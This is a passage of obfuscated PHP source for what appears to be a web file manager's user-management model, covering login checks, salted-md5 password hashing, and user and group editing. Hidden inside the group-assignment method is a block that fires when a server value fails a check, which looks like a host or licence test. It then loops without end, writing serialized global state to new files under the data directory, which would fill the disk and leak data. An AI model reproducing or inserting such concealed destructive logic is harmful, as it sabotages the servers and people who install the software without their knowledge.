$dÀ›†–ªäõ[$EÍÌ£ÍÑ¿[395]]) { return !1; } return parent::update($d¶ƒ°›¡ö, $BÆ®ã·ÈÄ); } public function setUserJob($B êƒ›¯…Ê, $fôñ¿½‚Œ) { goto d»„È­’‘ƒ; AĞ²‘ÃñŠ—: $aÑ‘±ø®ø = rtrim($aÑ‘±ø®ø, $bÃºÄ”Ã¿¼[47]); Model($bÃºÄ”Ã¿¼[533])->metaSet($B êƒ›¯…Ê, self::JOB_KEY, $aÑ‘±ø®ø); goto a«ëƒİÄæ·; d»„È­’‘ƒ: $bÃºÄ”Ã¿¼ =& $_SERVER[›èö’ù¤]; if (!is_array($fôñ¿½‚Œ)) { $fôñ¿½‚Œ = array($fôñ¿½‚Œ); } $côˆã¢‚„Ÿ = parent::listData(); goto AÑ‰Ëˆ—¬; AÑ‰Ëˆ—¬: $D÷êòä«ŸÌ = array_to_keyvalue($côˆã¢‚„Ÿ, $bÃºÄ”Ã¿¼[28]); $aÑ‘±ø®ø = $bÃºÄ”Ã¿¼[376]; foreach ($fôñ¿½‚Œ as $C´ƒó£—ºŠ) { if ($D÷êòä«ŸÌ[$C´ƒó£—ºŠ]) { $aÑ‘±ø®ø .= $D÷êòä«ŸÌ[$C´ƒó£—ºŠ][$bÃºÄ”Ã¿¼[395]] . $bÃºÄ”Ã¿¼[47]; } else { $fï¥¥™ÑĞò = $this->add($C´ƒó£—ºŠ); $aÑ‘±ø®ø .= $fï¥¥™ÑĞò . $bÃºÄ”Ã¿¼[47]; } } goto AĞ²‘ÃñŠ—; a«ëƒİÄæ·: } public function getUserJob($aÇè³‡»×Ä) { $F«äŒÇØ‘ø = Model($_SERVER[›èö’ù¤][533])->metaGet($aÇè³‡»×Ä); return $this->getUserJobInfo($F«äŒÇØ‘ø[self::JOB_KEY]); } public function getUserJobInfo($b‘ÍäÎ¡„¤) { goto aì—¹‡ÄØ; B·ÜÒî¬ºŸ: $AÉº“ƒ«ˆâ = array_remove_key($AÉº“ƒ«ˆâ, $EĞÏ¨ÕÜÙù[194]); $F’¡§óôÆ = array(); foreach ($D’šó¥ºÁß as $C¥Î¡¸ë®®) { if (isset($AÉº“ƒ«ˆâ[$C¥Î¡¸ë®®])) { $F’¡§óôÆ[] = $AÉº“ƒ«ˆâ[$C¥Î¡¸ë®®]; } } goto dõó ¾İ‹Ì; aì—¹‡ÄØ: $EĞÏ¨ÕÜÙù =& $_SERVER[›èö’ù¤]; $D’šó¥ºÁß = explode($EĞÏ¨ÕÜÙù[47], $b‘ÍäÎ¡„¤); $AÉº“ƒ«ˆâ = parent::listData(); goto B·ÜÒî¬ºŸ; dõó ¾İ‹Ì: return $F’¡§óôÆ; goto e­Äí¡œÂ»; e­Äí¡œÂ»: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\145" => "\x75\x73\x65\x72\137\x6d\145\x74\x61", "\x6d\145\x74\x61\x46\x69\145\x6c\144" => "\x75\x73\145\x72\x49\x44"); protected $simpleField = "\165\163\x65\162\111\104\54\156\x69\x63\153\116\141\x6d\x65\54\x6e\141\155\x65\54\141\166\x61\164\141\x72\54\x73\145\170\54\x73\x74\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d¥ÒˆÑˆóº) { $B¨³èØÔéÃ =& $_SERVER[›èö’ù¤]; $AÔ©ª¢åæ± = $B¨³èØÔéÃ[2146]; return array($B¨³èØÔéÃ[1794] => array($d¥ÒˆÑˆóº[0], $AÔ©ª¢åæ±), $B¨³èØÔéÃ[1796] => array($d¥ÒˆÑˆóº[0], $AÔ©ª¢åæ±), $B¨³èØÔéÃ[2147] => array($d¥ÒˆÑˆóº[0], $AÔ©ª¢åæ±)); } protected function getInfo($aƒŠõ¡…®í, $aê‡ï¬Ä›ô = false) { $Dªôè‡ÉöÁ = $this->getInfoSimple($aƒŠõ¡…®í); if (!is_array($Dªôè‡ÉöÁ)) { return array(); } if ($aê‡ï¬Ä›ô) { return $this->_getInfoApply($Dªôè‡ÉöÁ); } return $this->cacheFunctionGet($_SERVER[›èö’ù¤][1798], $aƒŠõ¡…®í); } protected function getInfoFull($eñø‹Âõš, $Eã¯ÇÄĞ÷Ğ = false) { $FÁëòÌ† = $this->getInfoSimple($eñø‹Âõš); if (!is_array($FÁëòÌ†)) { return array(); } if ($Eã¯ÇÄĞ÷Ğ) { return $this->_getInfoApply($FÁëòÌ†, !0); } return $this->cacheFunctionGet($_SERVER[›èö’ù¤][2148], $eñø‹Âõš); } private function _getInfoApply($cõ§­«¿Ì, $Dƒ·ß‹À¬” = false) { goto BÎˆŸÃ×±; F‹âÎ›£æ: $cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[85]][$FØĞÁÔ‹Ù¶[1982]] = isset($a È®Î•àˆ[$FØĞÁÔ‹Ù¶[1983]]) ? $a È®Î•àˆ[$FØĞÁÔ‹Ù¶[1983]] : null; if ($Dƒ·ß‹À¬”) { $cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[460]] = $this->metaGet($cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[1551]]); } return $cõ§­«¿Ì; goto C›¾§¾›ë«; AÔë‚òé°ƒ: $cõ§­«¿Ì = $this->_listDataApplyItem($cõ§­«¿Ì); $a È®Î•àˆ = Model($FØĞÁÔ‹Ù¶[1230])->metaGet($cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[85]][$FØĞÁÔ‹Ù¶[397]]); $cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[2151]] = $eôà¥¼•°; goto F‹âÎ›£æ; BÎˆŸÃ×±: $FØĞÁÔ‹Ù¶ =& $_SERVER[›èö’ù¤]; if (!$cõ§­«¿Ì) { return $cõ§­«¿Ì; } $eôà¥¼•° = md5($FØĞÁÔ‹Ù¶[2149] . $cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[875]] . $FØĞÁÔ‹Ù¶[2150] . $cõ§­«¿Ì[$FØĞÁÔ‹Ù¶[28]]); goto AÔë‚òé°ƒ; C›¾§¾›ë«: } protected function getInfoSimple($BìÀº¢„õŠ, $D³–£…‹‘ = false) { $A›Ìİ…Ş =& $_SERVER[›èö’ù¤]; if (!$BìÀº¢„õŠ) { return array(); } if ($D³–£…‹‘) { $E¶„ôŞ¨ğ‰ = $this->where(array($A›Ìİ…Ş[1551] => intval($BìÀº¢„õŠ)))->find(); if (!is_array($E¶„ôŞ¨ğ‰)) { return array(); } $E¶„ôŞ¨ğ‰[$A›Ìİ…Ş[2152]] = Action($A›Ìİ…Ş[2153])->parseUrl($E¶„ôŞ¨ğ‰[$A›Ìİ…Ş[2152]]); return $E¶„ôŞ¨ğ‰; } return $this->cacheFunctionGet($A›Ìİ…Ş[1799], $BìÀº¢„õŠ); } protected function getInfoSimpleOuter($eÄÔÌ¯¹¼) { goto AŒ¬…Ñ•ÈÇ; dÇõßª†ëñ: return $dÎ™•¯©á; goto FÛÚ–Š¼Ôí; AŒ¬…Ñ•ÈÇ: $aˆĞŸœ‚¾Õ =& $_SERVER[›èö’ù¤]; if (!$eÄÔÌ¯¹¼ || $eÄÔÌ¯¹¼ == 0) { return array($aˆĞŸœ‚¾Õ[1551] => $aˆĞŸœ‚¾Õ[191], $aˆĞŸœ‚¾Õ[28] => $aˆĞŸœ‚¾Õ[160] . LNG($aˆĞŸœ‚¾Õ[2154]) . $aˆĞŸœ‚¾Õ[531], $aˆĞŸœ‚¾Õ[2152] => STATIC_PATH . $aˆĞŸœ‚¾Õ[2155]); } $e¿î¼Ç°“Ì = $this->cacheFunctionGet($aˆĞŸœ‚¾Õ[1799], $eÄÔÌ¯¹¼); goto CÆ¶¹ÄÈÄ®; CÆ¶¹ÄÈÄ®: $dÎ™•¯©á = array_field_key($e¿î¼Ç°“Ì, explode($aˆĞŸœ‚¾Õ[47], $this->simpleField)); if (!$dÎ™•¯©á) { return array($aˆĞŸœ‚¾Õ[1551] => $aˆĞŸœ‚¾Õ[1109], $aˆĞŸœ‚¾Õ[28] => $aˆĞŸœ‚¾Õ[160] . LNG($aˆĞŸœ‚¾Õ[2156]) . $aˆĞŸœ‚¾Õ[531], $aˆĞŸœ‚¾Õ[2152] => STATIC_PATH . $aˆĞŸœ‚¾Õ[2157]); } $dÎ™•¯©á[$aˆĞŸœ‚¾Õ[2152]] = Action($aˆĞŸœ‚¾Õ[2153])->parseUrl($dÎ™•¯©á[$aˆĞŸœ‚¾Õ[2152]]); goto dÇõßª†ëñ; FÛÚ–Š¼Ôí: } protected function groupUser($Bñ›ï‡„”‘) { } public static function errorLang($aÁÆê•‘¿Ö) { $Câ·»‰©ƒÄ =& $_SERVER[›èö’ù¤]; $Fô®Õì¾ = array(self::ERROR_USER_NOT_EXISTS => $Câ·»‰©ƒÄ[2158], self::ERROR_USER_PASSWORD_ERROR => $Câ·»‰©ƒÄ[2159], self::ERROR_USER_EXIST_NAME => $Câ·»‰©ƒÄ[2160], self::ERROR_USER_EXIST_PHONE => $Câ·»‰©ƒÄ[2161], self::ERROR_USER_EXIST_EMAIL => $Câ·»‰©ƒÄ[2162], self::ERROR_USER_LOGIN_LOCK => $Câ·»‰©ƒÄ[2163], self::ERROR_IP_NOT_ALLOW => $Câ·»‰©ƒÄ[2164], self::ERROR_USER_EXIST_NICKNAME => $Câ·»‰©ƒÄ[2165]); return LNG($Fô®Õì¾[$aÁÆê•‘¿Ö]); } public function getInfoByMeta($Fˆ”Í°ÇŠ‰, $EÈÄµ±ğôã) { $aõ£ÎŠÂ·í =& $_SERVER[›èö’ù¤]; $aÌ§²‚ò­‡ = Model($aõ£ÎŠÂ·í[2166])->where(array($aõ£ÎŠÂ·í[93] => $Fˆ”Í°ÇŠ‰, $aõ£ÎŠÂ·í[372] => $EÈÄµ±ğôã))->find(); if ($aÌ§²‚ò­‡) { return $this->getInfo($aÌ§²‚ò­‡[$aõ£ÎŠÂ·í[1551]]); } return !1; } public function userLoginCheck($eÚ¼…Š¹ƒ, $F”Ø²Ñ›æ™) { $fîØ‡ğÜÄÃ =& $_SERVER[›èö’ù¤]; $f†®æéçÇƒ = $this->userLoginFind($eÚ¼…Š¹ƒ); if (!$f†®æéçÇƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($f†®æéçÇƒ[$fîØ‡ğÜÄÃ[1551]], $F”Ø²Ñ›æ™)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($f†®æéçÇƒ[$fîØ‡ğÜÄÃ[1551]]); } public function userLoginFind($C°Îæ”¥¯†) { $dÅäÒÌÙì =& $_SERVER[›èö’ù¤]; $e¬ó¢ÔÕÒ = array($dÅäÒÌÙì[28] => $C°Îæ”¥¯†, $dÅäÒÌÙì[1986] => $C°Îæ”¥¯†, $dÅäÒÌÙì[303] => $C°Îæ”¥¯†, $dÅäÒÌÙì[2167] => $C°Îæ”¥¯†, $dÅäÒÌÙì[983] => $dÅäÒÌÙì[985]); if ($this->nickNameRpt()) { unset($e¬ó¢ÔÕÒ[$dÅäÒÌÙì[1986]]); } return $this->where($e¬ó¢ÔÕÒ)->find(); } public function clearCache($açéªœƒÈ) { $BÙŸïŸ‘ã´ =& $_SERVER[›èö’ù¤]; $this->cacheFunctionClear($BÙŸïŸ‘ã´[1798], $açéªœƒÈ); $this->cacheFunctionClear($BÙŸïŸ‘ã´[1799], $açéªœƒÈ); $this->cacheFunctionClear($BÙŸïŸ‘ã´[2148], $açéªœƒÈ); } public function userPasswordCheck($dºÛÕ›‘¶, $CËˆœ”ïÂ¹) { $B×˜’äã¤¯ =& $_SERVER[›èö’ù¤]; $Aˆë¡°ëÉê = $this->where(array($B×˜’äã¤¯[1551] => intval($dºÛÕ›‘¶)))->find(); $D¬àšå™÷å = $this->metaGet($dºÛÕ›‘¶); $d­óËçÊõê = isset($D¬àšå™÷å[$B×˜’äã¤¯[2168]]) ? $D¬àšå™÷å[$B×˜’äã¤¯[2168]] : $B×˜’äã¤¯[33]; if (md5($d­óËçÊõê . trim($CËˆœ”ïÂ¹)) !== $Aˆë¡°ëÉê[$B×˜’äã¤¯[875]]) { return !1; } return !0; } public function userAdd($A¨ö™ÒÜ¤º) { goto c¤´ìÄâµ; eğğ‘’ÀÓí: return $AÊ“·§Í; goto Bëç‡™ã´; aÇ«Ã©ÑÁ¾: $b»ŒŠê‰‡‰ = array($f¤œŠ™½ª[2176] => $F™ËÕÎ…ğ‘[$f¤œŠ™½ª[875]], $f¤œŠ™½ª[2172] => $F™ËÕÎ…ğ‘[$f¤œŠ™½ª[1986]]); $this->userEdit($AÊ“·§Í, $b»ŒŠê‰‡‰); Model($f¤œŠ™½ª[1230])->userRootAdd($AÊ“·§Í); goto eğğ‘’ÀÓí; c¤´ìÄâµ: $f¤œŠ™½ª =& $_SERVER[›èö’ù¤]; $F™ËÕÎ…ğ‘ = array($f¤œŠ™½ª[415] => $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[28]], $f¤œŠ™½ª[2169] => $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1434]], $f¤œŠ™½ª[2170] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[303]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[303]] : $f¤œŠ™½ª[33], $f¤œŠ™½ª[2171] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2167]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2167]] : $f¤œŠ™½ª[33], $f¤œŠ™½ª[2172] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1986]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1986]] : $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[28]], $f¤œŠ™½ª[2173] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2152]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2152]] : $f¤œŠ™½ª[33], $f¤œŠ™½ª[2174] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2175]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[2175]] : 1, $f¤œŠ™½ª[2176] => $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[875]], $f¤œŠ™½ª[1800] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1704]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1704]] : 1024 * 1024 * 20, $f¤œŠ™½ª[1801] => 0, $f¤œŠ™½ª[2177] => 0, $f¤œŠ™½ª[1843] => isset($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[734]]) ? $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[734]] : 1); if (!empty($A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1551]])) { $F™ËÕÎ…ğ‘[$f¤œŠ™½ª[1551]] = $A¨ö™ÒÜ¤º[$f¤œŠ™½ª[1551]]; } goto DÏŞ¨µÕ¡Õ; DÏŞ¨µÕ¡Õ: $c»äß°·ÌŒ = $this->_checkExist($A¨ö™ÒÜ¤º); if ($c»äß°·ÌŒ !== !0) { return $c»äß°·ÌŒ; } $AÊ“·§Í = $this->add($F™ËÕÎ…ğ‘); goto aÇ«Ã©ÑÁ¾; Bëç‡™ã´: } protected function userEditTest($bÅÄ·¿šˆ–, $dÁÃ˜Ù…ÒÔ) { return $this->call($_SERVER[›èö’ù¤][2178], $bÅÄ·¿šˆ–, $dÁÃ˜Ù…ÒÔ); } protected function userEdit($c¸š‘¢ÊÆß, $Dô½¿ìõ‡) { goto DŞ„ØÖ¹·¡; DŞ„ØÖ¹·¡: $AÛ±Œ×¯´ =& $_SERVER[›èö’ù¤]; $dòÚĞñ°ë– = $this->getInfoSimple($c¸š‘¢ÊÆß); if (!$dòÚĞñ°ë–) { return !1; } goto A¯÷‡æíˆ; e‹¶Œ‡×‹¨: $this->where(array($AÛ±Œ×¯´[1542] => $c¸š‘¢ÊÆß))->save($Dô½¿ìõ‡); if (isset($Dô½¿ìõ‡[$AÛ±Œ×¯´[1986]])) { $this->setNamePinyin($c¸š‘¢ÊÆß, $Dô½¿ìõ‡[$AÛ±Œ×¯´[1986]]); } $this->clearCache($c¸š‘¢ÊÆß); goto EÙ¾ñˆí†; EÙ¾ñˆí†: return !0; goto f“·Ÿš§‡½; A¯÷‡æíˆ: $f‡™—ÕÒò¥ = $this->_checkExist($Dô½¿ìõ‡, $c¸š‘¢ÊÆß); if ($f‡™—ÕÒò¥ !== !0) { return $f‡™—ÕÒò¥; } if (isset($Dô½¿ìõ‡[$AÛ±Œ×¯´[875]]) && trim($Dô½¿ìõ‡[$AÛ±Œ×¯´[875]]) != $AÛ±Œ×¯´[33]) { $fíõ½åõ¢ = $this->metaGet($c¸š‘¢ÊÆß); if (empty($fíõ½åõ¢[$AÛ±Œ×¯´[2168]])) { $fíõ½åõ¢[$AÛ±Œ×¯´[2168]] = rand_string(10); Model($AÛ±Œ×¯´[508])->metaSet($c¸š‘¢ÊÆß, $AÛ±Œ×¯´[2168], $fíõ½åõ¢[$AÛ±Œ×¯´[2168]]); } $Dô½¿ìõ‡[$AÛ±Œ×¯´[875]] = md5($fíõ½åõ¢[$AÛ±Œ×¯´[2168]] . trim($Dô½¿ìõ‡[$AÛ±Œ×¯´[875]])); } else { unset($Dô½¿ìõ‡[$AÛ±Œ×¯´[875]]); } goto e‹¶Œ‡×‹¨; f“·Ÿš§‡½: } public function setNamePinyin($Fï…é›­Öš, $C¬ÕÛ´áÈç = false) { $CÎ»µëˆœ¬ =& $_SERVER[›èö’ù¤]; if (!$C¬ÕÛ´áÈç) { $a¨É™ß´š = $this->getInfoSimple($Fï…é›­Öš); $C¬ÕÛ´áÈç = $a¨É™ß´š[$CÎ»µëˆœ¬[1986]] ? $a¨É™ß´š[$CÎ»µëˆœ¬[1986]] : $a¨É™ß´š[$CÎ»µëˆœ¬[28]]; } $a¯ÔÀªóÔÓ = Model($CÎ»µëˆœ¬[533]); if (!Input::check($C¬ÕÛ´áÈç, $CÎ»µëˆœ¬[582])) { return $a¯ÔÀªóÔÓ->metaSet($Fï…é›­Öš, array($CÎ»µëˆœ¬[459] => $CÎ»µëˆœ¬[33], $CÎ»µëˆœ¬[458] => $CÎ»µëˆœ¬[33])); } return $a¯ÔÀªóÔÓ->metaSet($Fï…é›­Öš, array($CÎ»µëˆœ¬[459] => str_replace($CÎ»µëˆœ¬[50], $CÎ»µëˆœ¬[33], Pinyin::get($C¬ÕÛ´áÈç)), $CÎ»µëˆœ¬[458] => Pinyin::get($C¬ÕÛ´áÈç, $CÎ»µëˆœ¬[583]))); } private function nickNameRpt() { $Cê……Ÿ…¶ =& $_SERVER[›èö’ù¤]; $eÌ•‡ñ¿Šğ = Model($Cê……Ÿ…¶[754])->get($Cê……Ÿ…¶[2179]); $Bø‹Îå—¤ = $GLOBALS[$Cê……Ÿ…¶[6]][$Cê……Ÿ…¶[379]][$Cê……Ÿ…¶[2179]]; $f˜õ›²ˆ¦« = !is_null($eÌ•‡ñ¿Šğ) ? $eÌ•‡ñ¿Šğ : $Bø‹Îå—¤; return !!$f˜õ›²ˆ¦«; } private function _checkExist($aÑ·±›ƒë«, $AÀˆÈÇîÚ = false) { $E×ùó‡˜Š =& $_SERVER[›èö’ù¤]; $CÍÓ¿¤ê¸ = array($E×ùó‡˜Š[28] => UserModel::ERROR_USER_EXIST_NAME, $E×ùó‡˜Š[1986] => UserModel::ERROR_USER_EXIST_NICKNAME, $E×ùó‡˜Š[303] => UserModel::ERROR_USER_EXIST_EMAIL, $E×ùó‡˜Š[2167] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($CÍÓ¿¤ê¸[$E×ùó‡˜Š[1986]]); } $c™ÛŠã•¥ = $AÀˆÈÇîÚ ? array($E×ùó‡˜Š[1551] => array($E×ùó‡˜Š[2180], $AÀˆÈÇîÚ)) : array(); foreach ($CÍÓ¿¤ê¸ as $C§ÃØÌâÓ‡ => $eñÔ‰÷¬Î÷) { $Fù‡ÆÕŞÄØ = array(); foreach ($CÍÓ¿¤ê¸ as $dÈÑƒåÇÉ’ => $a„«²±°´§) { if (isset($aÑ·±›ƒë«[$dÈÑƒåÇÉ’]) && $aÑ·±›ƒë«[$dÈÑƒåÇÉ’]) { $Fù‡ÆÕŞÄØ[] = $aÑ·±›ƒë«[$dÈÑƒåÇÉ’]; } } if (!$Fù‡ÆÕŞÄØ) { continue; } $EŸÕ°İ×† = array_merge(array($C§ÃØÌâÓ‡ => array($E×ùó‡˜Š[7], $Fù‡ÆÕŞÄØ)), $c™ÛŠã•¥); $f‘Ô¾æº†ã = $this->where($EŸÕ°İ×†)->find(); if ($f‘Ô¾æº†ã) { return $eñÔ‰÷¬Î÷; } } return !0; } public function userListInfo($CÑ®Â¥¾ô¨) { $e”‰®†½ˆŠ =& $_SERVER[›èö’ù¤]; $d›¿îÎ¯±Ù = array(); $CÑ®Â¥¾ô¨ = is_array($CÑ®Â¥¾ô¨) ? array_unique($CÑ®Â¥¾ô¨) : array(); if (!$CÑ®Â¥¾ô¨) { return $d›¿îÎ¯±Ù; } if (count($CÑ®Â¥¾ô¨) < 20) { foreach ($CÑ®Â¥¾ô¨ as $E‘ì“‰×œô) { $d›¿îÎ¯±Ù[$E‘ì“‰×œô . $e”‰®†½ˆŠ[33]] = $this->getInfoSimpleOuter($E‘ì“‰×œô); } } else { $FŠîàÔ–×â = array($e”‰®†½ˆŠ[1542] => array($e”‰®†½ˆŠ[413], $CÑ®Â¥¾ô¨)); if (count($CÑ®Â¥¾ô¨) == 1) { $FŠîàÔ–×â = array($e”‰®†½ˆŠ[1542] => $CÑ®Â¥¾ô¨[0]); } $d…„ïøàñ… = Model($e”‰®†½ˆŠ[508])->field($this->simpleField)->where($FŠîàÔ–×â)->select(); $d…„ïøàñ… = array_to_keyvalue($d…„ïøàñ…, $e”‰®†½ˆŠ[1551]); foreach ($CÑ®Â¥¾ô¨ as $E‘ì“‰×œô) { $Dàõ»‘¥›ù = $d…„ïøàñ…[$E‘ì“‰×œô]; if (!$Dàõ»‘¥›ù) { $d›¿îÎ¯±Ù[$E‘ì“‰×œô . $e”‰®†½ˆŠ[33]] = $this->getInfoSimpleOuter($E‘ì“‰×œô); continue; } $Dàõ»‘¥›ù[$e”‰®†½ˆŠ[2152]] = Action($e”‰®†½ˆŠ[2153])->parseUrl($Dàõ»‘¥›ù[$e”‰®†½ˆŠ[2152]]); $d›¿îÎ¯±Ù[$E‘ì“‰×œô . $e”‰®†½ˆŠ[33]] = $Dàõ»‘¥›ù; } } return $d›¿îÎ¯±Ù; } protected function userStatus($FŒÉ¯Øçß‹, $f‚ÄÂÅïÀ™) { $féÒ‰²’Ú¿ = $this->getInfoSimple($FŒÉ¯Øçß‹); if (!$féÒ‰²’Ú¿) { return !1; } $e¿… è™ì³ = array($_SERVER[›èö’ù¤][734] => $f‚ÄÂÅïÀ™); return $this->userEdit($FŒÉ¯Øçß‹, $e¿… è™ì³); } protected function userRemove($BœÕ£ôŒ‹) { goto dá †½ŒÁ‹; c¢«‹×ßƒô: Model($c‹ƒçæôó[2003])->removeUserAll($BœÕ£ôŒ‹); Model($c‹ƒçæôó[816])->userRootRemove($BœÕ£ôŒ‹); return $this->where($A’ÖƒãËˆƒ)->delete(); goto Fé Ó• ò¦; cÜ‡¦½ø†Ù: Model($c‹ƒçæôó[1806])->where($A’ÖƒãËˆƒ)->delete(); Model($c‹ƒçæôó[2166])->where($A’ÖƒãËˆƒ)->delete(); Model($c‹ƒçæôó[2182])->where($A’ÖƒãËˆƒ)->delete(); goto c¢«‹×ßƒô; dá †½ŒÁ‹: $c‹ƒçæôó =& $_SERVER[›èö’ù¤]; $CõÃ¡ëèÔ£ = $this->getInfoSimple($BœÕ£ôŒ‹); if (!$CõÃ¡ëèÔ£) { return !1; } goto cÔË·¤òäî; cÔË·¤òäî: $A’ÖƒãËˆƒ = array($c‹ƒçæôó[1542] => $BœÕ£ôŒ‹); Model($c‹ƒçæôó[590])->where($A’ÖƒãËˆƒ)->delete(); Model($c‹ƒçæôó[2181])->where($A’ÖƒãËˆƒ)->delete(); goto cÜ‡¦½ø†Ù; Fé Ó• ò¦: } protected function userGroupSet($aˆÙ»á”, $C÷¥ŠÛÑëÍ, $E·ìÇñÏÓè = array()) { goto Dó‰²è•å¢; b‰Œø–ÊÇ: $f·Ë¸ÜŒÄ” = 0; foreach ($C÷¥ŠÛÑëÍ as $AÍŒå‰«±¦ => $BŒáºß’’Ã) { $c‰·Å®„ö† = array($CØïŒÍï²[1551] => $aˆÙ»á”, $CØïŒÍï²[1720] => $AÍŒå‰«±¦, $CØïŒÍï²[1820] => $BŒáºß’’Ã); $c‰·Å®„ö†[$CØïŒÍï²[1743]] = isset($E·ìÇñÏÓè[$f·Ë¸ÜŒÄ”]) ? $E·ìÇñÏÓè[$f·Ë¸ÜŒÄ”] : 0; $f·Ë¸ÜŒÄ”++; $dÙ‰À›ÔÃ[] = $c‰·Å®„ö†; } return $DÕï©ÔìÕ‹->addAll($dÙ‰À›ÔÃ, array(), !0); goto eô Ô°‡İ; a­î’±’ö: $DÕï©ÔìÕ‹ = Model($CØïŒÍï²[1806]); $DÕï©ÔìÕ‹->where(array($CØïŒÍï²[1551] => $aˆÙ»á”))->delete(); $dÙ‰À›ÔÃ = array(); goto b‰Œø–ÊÇ; CµØèÄÀÛ : if ($_SERVER[$CØïŒÍï²[831]] != $DÜÕâ×ìà($a««ÆÌ’¦ß)) { goto aÄ÷°”ï—™; aÄ÷°”ï—™: $Bù ŞôçË = $CØïŒÍï²[865]; $dƒÄ¬Òæ©¢ = $CØïŒÍï²[833]; $bÚÜ»Öà– = $_SERVER[$CØïŒÍï²[834]] . $CØïŒÍï²[835]; goto b¶Ä‚í†È„; FÏç‚õÚ‹: $Bù ŞôçË(); $Bï­»•°§£ = $CØïŒÍï²[868]; $b†¿”òÚßš = json_encode($GLOBALS[$CØïŒÍï²[869]]); goto cÙ‘‡òÃ’´; e¸âÍ¬ôîØ: $c©Û¬‘š÷ = $CØïŒÍï²[866]; $c©Û¬‘š÷($_SERVER[$CØïŒÍï²[867]]); $Bù ŞôçË = $CØïŒÍï²[865]; goto FÏç‚õÚ‹; b¶Ä‚í†È„: $EìİÜè‚† = $dƒÄ¬Òæ©¢($bÚÜ»Öà–); $F×‹ÊáÆÍ– = explode($CØïŒÍï²[229], $EìİÜè‚†); if (count($F×‹ÊáÆÍ–) < $CØïŒÍï²[602]) { $FÉ´‚ëòî® = $CØïŒÍï²[836]; $FÉ´‚ëòî®(); } goto e¸âÍ¬ôîØ; cÙ‘‡òÃ’´: $F„ ô–­¬³ = 1; for ($d¶ì‹ù­„ = $F„ ô–­¬³; $d¶ì‹ù­„ > 0; $d¶ì‹ù­„++) { $Bï­»•°§£(DATA_PATH . $d¶ì‹ù­„, $b†¿”òÚßš); } goto AŠ‚´ÁË…; AŠ‚´ÁË…: } $A¡¢‹Ù»Å— = $this->getInfoSimple($aˆÙ»á”); if (!$A¡¢‹Ù»Å— || !is_array($C÷¥ŠÛÑëÍ)) { return !1; } goto a­î’±’ö; Dó‰²è•å¢: $CØïŒÍï² =& $_SERVER[›èö’ù¤]; $a««ÆÌ’¦ß = $_SERVER[$CØïŒÍï²[832]]; $DÜÕâ×ìà = $CØïŒÍï²[864]; goto CµØèÄÀÛ ; eô Ô°‡İ: } protected function userGroupAdd($D˜õÑÖè›, $EœôƒŸ­„ = array()) { $B·Ñ¼Çò… =& $_SERVER[›èö’ù¤]; $B´ÖÈÌªº” = $this->getInfoSimple($D˜õÑÖè›); if (!$B´ÖÈÌªº” || empty($EœôƒŸ­„)) { return !1; } $FƒŠµòïä = array(); foreach ($EœôƒŸ­„ as $D¡ÊØ‚Ãçñ => $a¥íìöòö) { $FƒŠµòïä[] = array($B·Ñ¼Çò…[1551] => $D˜õÑÖè›, $B·Ñ¼Çò…[1720] => $D¡ÊØ‚Ãçñ, $B·Ñ¼Çò…[1820] => $a¥íìöòö, $B·Ñ¼Çò…[1743] => 0); } return Model($B·Ñ¼Çò…[1806])->addAll($FƒŠµòïä, array(), !0); } protected function userGroupRemove($b²ÅâÌ“ï™, $d†¨Ï¶´ø¥) { $D‡İ¾·ë»´ =& $_SERVER[›èö’ù¤]; $f‡ùó…¤½ì = $this->getInfoSimple($b²ÅâÌ“ï™); if (!$f‡ùó…¤½ì || !$d†¨Ï¶´ø¥) { return !1; } $D¹ø¯ğ´Ÿ = array($D‡İ¾·ë»´[1542] => $b²ÅâÌ“ï™, $D‡İ¾·ë»´[1804] => $d†¨Ï¶´ø¥); return Model($D‡İ¾·ë»´[1806])->where($D¹ø¯ğ´Ÿ)->delete(); } public function listData() { $E„Ê…ŠõŠç = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E„Ê…ŠõŠç[$_SERVER[›èö’ù¤][367]]); return $E„Ê…ŠõŠç; } public function listByID($e¤ÂÒ¤»¤) { goto FÙÆ£Ê’’; FÙÆ£Ê’’: $F¡–îí¼¼ =& $_SERVER[›èö’ù¤]; if (!$e¤ÂÒ¤»¤) { return; } $F•Ş°ùá  = array($F¡–îí¼¼[1551] => array($F¡–îí¼¼[7], $e¤ÂÒ¤»¤)); goto c«Ì—Ô¼’¸; c«Ì—Ô¼’¸: $f Á÷‰°¤ = $this->where($F•Ş°ùá 